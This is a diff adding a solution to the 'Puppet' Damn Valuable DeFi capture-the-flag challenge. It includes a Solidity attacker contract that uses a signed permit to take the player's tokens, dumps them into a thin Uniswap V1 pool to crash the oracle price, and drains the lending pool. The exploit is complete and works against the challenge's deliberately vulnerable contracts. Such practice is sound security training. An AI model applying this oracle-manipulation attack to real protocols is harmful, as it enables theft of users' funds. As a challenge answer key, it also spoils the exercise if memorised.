@@ -92,7 +92,31 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // The attacker contract will be created by the player's next (and only) tx,
+        // so its address is known in advance and can be named as the permit spender.
+        address attackerAddr = vm.computeCreateAddress(player, vm.getNonce(player));
+        uint256 deadline = block.timestamp + 1 days;
+
+        // Off-chain permit signature: lets the attacker pull the player's DVT
+        // without a separate approve/transfer transaction.
+        bytes32 structHash = keccak256(
+            abi.encode(
+                keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                player,
+                attackerAddr,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                token.nonces(player),
+                deadline
+            )
+        );
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+
+        // The single transaction: deploy the attacker with the player's ETH.
+        // Everything else happens inside its constructor.
+        new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token, lendingPool, uniswapV1Exchange, player, recovery, PLAYER_INITIAL_TOKEN_BALANCE, deadline, v, r, s
+        );
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +139,37 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract PuppetAttacker {
+    constructor(
+        DamnValuableToken token,
+        PuppetPool pool,
+        IUniswapV1Exchange exchange,
+        address player,
+        address recovery,
+        uint256 amount,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) payable {
+        // 1. Pull the player's tokens using the signed permit
+        token.permit(player, address(this), amount, deadline, v, r, s);
+        token.transferFrom(player, address(this), amount);
+
+        // 2. Dump them into the tiny Uniswap pair: its token/ETH ratio, and so the
+        //    pool's price, collapses
+        token.approve(address(exchange), amount);
+        exchange.tokenToEthSwapInput(amount, 1, deadline);
+
+        // 3. Borrow the pool's entire balance against the now-cheap collateral,
+        //    sending the tokens straight to the recovery account
+        uint256 poolBalance = token.balanceOf(address(pool));
+        uint256 depositRequired = pool.calculateDepositRequired(poolBalance);
+        pool.borrow{value: depositRequired}(poolBalance, recovery);
+    }
+
+    // Needed to receive ETH from the Uniswap swap
+    receive() external payable {}
 }
